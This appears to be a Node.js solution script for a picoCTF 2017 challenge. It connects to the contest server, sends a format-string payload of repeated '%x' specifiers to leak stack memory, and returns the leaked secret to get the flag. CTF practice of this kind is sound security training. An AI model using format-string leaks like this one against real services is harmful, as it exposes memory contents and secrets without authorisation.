#!/usr/bin/env node

var Netcat = require("node-netcat");

var client = Netcat.client(10750, "shell2017.picoctf.com");

client.on("data", function(data) {
  if (data.toString("ascii") == "Give me something to say!\n") {
    client.send("FLAG===%x===%x===%x===%x===%x===%x\n");
  }
  if (data.toString("ascii").substring(0, 4) === "FLAG") {
    const secret = data
      .toString("ascii")
      .split("===")
      .pop()
      .replace("\n", "");
    client.send(secret + "\n");
  }
  console.log(data.toString("ascii"));
});

client.start();
